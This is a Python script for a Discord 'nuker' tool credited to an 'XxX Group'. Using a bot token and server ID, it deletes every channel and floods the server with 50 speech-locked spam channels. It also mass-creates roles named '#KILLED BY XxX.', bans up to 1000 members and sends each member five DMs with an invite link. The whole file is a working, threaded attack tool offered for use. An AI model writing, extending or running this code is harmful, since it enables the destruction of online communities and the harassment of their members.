import requests
import threading
import os
import time
from colorama import Fore, Style, init

init(autoreset=True)

# نظام حفظ البيانات
saved_data = {"token": "", "guild_id": ""}

LOGO = f"""{Fore.RED}
  Z7F NUKER | V2.0
  ----------------
  By: XxX Group
  ----------------{Style.RESET_ALL}"""

class Nuker:
    def __init__(self, token, guild_id):
        self.token = token
        self.guild_id = guild_id
        self.headers = {'Authorization': f'Bot {token}'}
        self.base_url = "https://discord.com/api/v9"

    # --- الدوال الأساسية ---
    def del_ch(self, ch_id):
        requests.delete(f"{self.base_url}/channels/{ch_id}", headers=self.headers)

    def create_ch(self):
        payload = {"name": "BN3AL-XxX-6666-Group", "type": 0}
        r = requests.post(f"{self.base_url}/guilds/{self.guild_id}/channels", headers=self.headers, json=payload)
        if r.status_code == 201:
            ch_id = r.json()['id']
            # قفل التحدث فوراً
            requests.put(f"{self.base_url}/channels/{ch_id}/permissions/{self.guild_id}", 
                         headers=self.headers, json={"allow": "0", "deny": "2048", "type": 0})

    def ban(self, mem_id):
        requests.put(f"{self.base_url}/guilds/{self.guild_id}/bans/{mem_id}", 
                     headers=self.headers, json={"delete_message_days": "7", "reason": "XxX Group ON TOP"})

    def create_role(self):
        requests.post(f"{self.base_url}/guilds/{self.guild_id}/roles", 
                      headers=self.headers, json={"name": "#KILLED BY XxX."})

    def send_dm(self, mem_id):
        # فتح خاص وإرسال رسالة
        r = requests.post(f"{self.base_url}/users/@me/channels", headers=self.headers, json={"recipient_id": mem_id})
        if r.status_code == 200:
            ch_id = r.json()['id']
            msg = "# السيرفر تجحفل | قروب XxX يرسل تحياته\nhttps://discord.gg/qb3FGfp4d"
            for _ in range(5):
                requests.post(f"{self.base_url}/channels/{ch_id}/messages", headers=self.headers, json={"content": msg})

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def main_menu():
    clear()
    print(LOGO)
    
    if not saved_data["token"]:
        saved_data["token"] = input(f" [>] Bot Token: ")
    if not saved_data["guild_id"]:
        saved_data["guild_id"] = input(f" [>] Guild ID: ")
    
    n = Nuker(saved_data["token"], saved_data["guild_id"])
    
    print(f"\n{Fore.YELLOW} [1] FULL NUKE      [2] ROLES NUKE     [3] CHANNEL NUKE")
    print(f" [4] SPAM WEBHOOK   [5] SPAM DM        [6] KICK BOTS")
    print(f" [7] TIMEOUT ALL    [8] BAN ALL        [9] ADMIN ALL")
    print(f" [10] SPAM EMBED")
    
    choice = input(f"\n [?] Choice: ")
    print(f"{Fore.RED} [*] Executing... Check the server.")

    # تنفيذ الأوامر (باستخدام Threads للسرعة)
    if choice == "3": # Channels
        res = requests.get(f"https://discord.com/api/v9/guilds/{n.guild_id}/channels", headers=n.headers).json()
        for c in res: threading.Thread(target=n.del_ch, args=(c['id'],)).start()
        for _ in range(50): threading.Thread(target=n.create_ch).start()

    elif choice == "8": # Ban All
        res = requests.get(f"https://discord.com/api/v9/guilds/{n.guild_id}/members?limit=1000", headers=n.headers).json()
        for m in res: threading.Thread(target=n.ban, args=(m['user']['id'],)).start()

    elif choice == "5": # Spam DM
        res = requests.get(f"https://discord.com/api/v9/guilds/{n.guild_id}/members?limit=1000", headers=n.headers).json()
        for m in res: threading.Thread(target=n.send_dm, args=(m['user']['id'],)).start()

    elif choice == "2": # Roles
        for _ in range(50): threading.Thread(target=n.create_role).start()

    input(f"\n{Fore.GREEN} [!] Task Sent. Press Enter to go back...")
    main_menu()

if __name__ == "__main__":
    main_menu()
